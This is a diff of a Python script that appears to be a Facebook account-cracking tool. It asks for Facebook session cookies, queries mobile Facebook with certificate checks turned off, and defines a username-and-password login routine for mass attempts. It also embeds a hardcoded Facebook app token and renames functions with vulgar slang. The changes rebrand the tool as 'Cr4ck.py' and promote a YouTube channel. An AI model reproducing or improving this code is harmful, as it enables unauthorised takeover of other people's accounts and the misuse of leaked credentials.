@@ -63,7 +63,7 @@ def mbfv2():
          id = []
          die = 0
          chek = []
-         live = []
+         hack = []
          count = 0
          check = 0
          result = 0
@@ -71,9 +71,9 @@ def mbfv2():
              try:
                     cek = open("cookies").read()
              except FileNotFoundError:
-                   lupo_lupo_milzu()
-                   peak()
-                   cek = input("\n\033[0;92m       [ \033[0;97mThis Server menggunakan fb cookies \033[0;92m]\n\n\033[97m [\033[91m*\033[97m] Cookies \033[1;91m👉 \033[1;96m")
+                   ikeh_ikeh_kimochi()
+                   kontol()
+                   cek = input("\n\033[0;92m       [ \033[0;97mThis Tool Use Facebook Cookies \033[0;92m]\n\n\033[97m [\033[91m?\033[97m] Cookies \033[1;91m: \033[1;96m")
                    print('\n\033[97m [\033[92m+\033[97m] \033[92mPleas Wait...')
              cek = {"cookie":cek}
              ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
@@ -98,7 +98,7 @@ def mbfv2():
                   os.system("xdg-open https://youtu.be/DF7bUCn0GFY") 
                   os.system('rm -rf cookies')
                   print(" \n \x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Cookies Error")
-                  os.system('python2 Milzuu.py')
+                  os.system('python Cr4ck.py')
          def login(username,password,cek=False):
              global die,check,result,count
              b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
@@ -217,7 +217,7 @@ def mbfv2():
                    if kentang =="":
                          print("\n\n\033[00m [\033[91m!\033[00m] Wrong Input!")
                          milzu()
-                   elif kentang == '0' or memek =='00':
+                   elif kentang == '0' or kentang =='00':
                          aahh("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My YouTube Channel\n\n")
                          os.system('xdg-open  https://youtube.com/channel/UCqHIxnz-uxVzLXARplFzzqQ-mg ')
                          exit()                   	
